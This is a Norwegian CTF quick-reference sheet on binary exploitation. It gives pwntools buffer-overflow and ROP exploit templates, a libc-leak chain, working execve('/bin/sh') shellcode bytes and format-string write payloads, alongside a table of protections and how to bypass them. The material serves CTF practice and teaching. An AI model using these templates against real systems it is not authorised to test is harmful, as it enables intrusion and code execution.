# 💥 Hurtigreferanse for pwn og binær utnyttelse i CTF

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

---

## 🔍 Innledende analyse

```bash
# Kontroller sikkerhetsmekanismer
checksec binary

# Filopplysninger
file binary
ldd binary        # Biblioteker

# Kjør programmet
./binary
ltrace ./binary   # Bibliotekkall
strace ./binary   # Systemkall
```

---

## 🛡️ Sikkerhetsmekanismer

| Mekanisme | Beskrivelse | Omgåelse |
|------------|-------------|--------|
| **NX** | Hindrer kjøring fra stakken | ROP |
| **ASLR** | Tilfeldige adresser | Lekk adresse og beregn |
| **PIE** | Tilfeldig basisadresse for programmet | Lekk en programadresse |
| **Canary** | Kontrollverdi på stakken | Lekk kontrollverdien |
| **RELRO** | Beskyttelse av GOT | Bruk andre teknikker |

---

## 📏 Bufferoverløp (buffer overflow)

> **Presisering:** Snippettene er ufullstendige, miljøavhengige skisser: adresser, offset og målarkitektur må være kjent. `pattern`-kommandoene krever et GDB-tillegg; de er ikke standard GDB. Den viste ROP-kjeden bygger bare payloaden og utfører ikke en full lekkasje-/returflyt. Gadget-linjene er assembly, ikke shellkommandoer. Overskriften 64-bit setter ikke alene pwntools-arkitekturen; shellcraft/asm forutsetter riktig kontekst. Tabellen over sikkerhetsmekanismer er en forenkling.

### Finne forskyvningen (offset)
```bash
# Med pwntools
cyclic 200        # Generer mønster
cyclic -l 0x6161616a  # Finn forskyvningen

# Med GDB
pattern create 200
pattern offset 0x6161616a
```

### Grunnleggende exploit (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Returadresse

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming)

### Finne gadgets
```bash
ROPgadget --binary binary
ropper -f binary

# Vanlige gadgets
pop rdi; ret
pop rsi; pop r15; ret
ret                  # For justering av stakken
```

### ROP-kjede (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Bygg kjeden
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Shellcode

### 64-biters Linux
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Manuelt
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Formatstrengsårbarheter (format string)

```bash
# Lekk verdier
%p %p %p %p %p
%x %x %x %x %x

# Skriv
%n - skriv antallet byte som er skrevet ut
%hhn - skriv én byte
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Verktøy

| Verktøy | Bruk |
|------|-----|
| **pwntools** | Python-bibliotek for pwn |
| **GDB + GEF** | Feilsøking |
| **ROPgadget** | Finn ROP-gadgets |
| **one_gadget** | Finn one-shot-gadgets i libc |
| **checksec** | Kontroller sikkerhetsmekanismer |

---

## 📋 Sjekkliste for pwn

```markdown
□ checksec binary
□ Finn sårbarheten (overløp, formatstreng)
□ Beregn forskyvningen
□ Kontroller sikkerhetsmekanismer
□ Bygg en exploit (shellcode/ROP)
□ Test lokalt
□ Tilpass til det eksterne miljøet
```

---

**Tilbake til CTF:** [🏁 CTF-oversikt](./README.nb.md)
